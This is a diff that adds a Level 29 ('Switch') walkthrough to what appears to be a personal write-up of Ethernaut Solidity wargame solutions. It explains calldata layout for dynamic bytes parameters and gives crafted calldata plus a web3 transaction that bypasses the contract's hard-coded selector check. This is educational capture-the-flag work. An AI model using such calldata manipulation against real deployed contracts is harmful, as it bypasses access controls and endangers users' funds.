@@ -32,6 +32,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 27. [Level 26: DoubleEntryPoint](#level-26-doubleentrypoint)
 28. [Level 27: Good Samaritan](#level-27-good-samaritan)
 29. [Level 28: Gaatekeeper Three](#level-28-gatekeeper-three)
+30. [Level 29: Switch](#level-29-switch)
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -3238,3 +3239,120 @@ And we are an entrant of the `GatekeeperThree` contract :)
 Not sure what new stuff we learned here, but it is always good to see how
 contracts can be exploited and practice our skills :)
 
+## Level 29: Switch <a name="level-29-switch">
+
+Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Switch {
+    bool public switchOn; // switch is off
+    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
+
+    modifier onlyThis() {
+        require(msg.sender == address(this), "Only the contract can call this");
+        _;
+    }
+
+    modifier onlyOff() {
+        // we use a complex data type to put in memory
+        bytes32[1] memory selector;
+        // check that the calldata at position 68 (location of _data)
+        assembly {
+            calldatacopy(selector, 68, 4) // grab function selector from calldata
+        }
+        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
+        _;
+    }
+
+    function flipSwitch(bytes memory _data) public onlyOff {
+        (bool success,) = address(this).call(_data);
+        require(success, "call failed :(");
+    }
+
+    function turnSwitchOn() public onlyThis {
+        switchOn = true;
+    }
+
+    function turnSwitchOff() public onlyThis {
+        switchOn = false;
+    }
+}
+```
+
+The contract gets deployed and the comment tells us that the `switchOn` variable
+is set to false. Our goal is to turn the switch to on.
+
+The only function we can call is the `flipSwitch` function. The `flipSwitch`
+function has one modifier, the `onlyOff` modifier. The `onlyOff` modifier checks
+if the 4 bytes at the 68th position of the calldata is equal to the `offSelector`
+variable, which holds the signature of the `turnSwitchOff()` function.
+
+If it is, the modifier passes and the `flipSwitch` function calls the `turnSwitchOff`
+function. 
+
+Question: How do we pass this level? Let's have a look how dynamic parameters
+(since we have bytes as a parameter) are passed to a function in Solidity.
+
+Whenever we call the `flipSwitch` function, the first 4 bytes of the calldata
+are the function selector `0x30c13ade = keccak256("flipSwitch(bytes)")`.
+After those 4 bytes comes the parameter, which is a dynamic type.
+
+The first 32 bytes of the dynamic type represent the offset of the data in the
+calldata. At the offset you will find first the lenght of the data, followed
+by the data itself.
+
+Here an example for calling `flipSwitch` with `0x20606e15` as parameter.
+
+```solidity
+30c13ade
+0000000000000000000000000000000000000000000000000000000000000020 //offset
+ ^-start counting offset from here
+0000000000000000000000000000000000000000000000000000000000000004 // length of data
+ ^-0x20 offset
+20606e1500000000000000000000000000000000000000000000000000000000 // data
+```
+
+The `onlyOff` modifier reads the data from a specific location from the calldata,
+68 bytes from the start of the calldata. That means, we have to provide the
+`offSelector` at that particular location.
+
+Let's modify the data we provide to the `flipSwitch` function, where we just move
+the real data, which is required to call the `turnSwitchOn` function:
+
+```solidity
+30c13ade
+0000000000000000000000000000000000000000000000000000000000000060
+0000000000000000000000000000000000000000000000000000000000000000
+20606e1500000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000000000000000000004
+76227e1200000000000000000000000000000000000000000000000000000000 // sig for turnSwitchOn
+```
+
+We changed the offset to `0x60` and added the signature of the `turnSwitchOn`
+function at the end of the data. The signature of the `turnSwitchOff` function
+is still at the 68th position of the calldata.
+
+Let's try it :)
+
+Run
+    
+```javascript
+await web3.eth.sendTransaction({from: player, to: contract.address, data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
+```
+
+and voila, the switch is turned on :)
+
+To confirm:
+
+```javascript
+await contract.switchOn() -> true
+```
+
+### Learning
+
+From the level itself:
+
+> Assuming positions in CALLDATA with dynamic types can be erroneous, especially when using hard-coded CALLDATA positions.
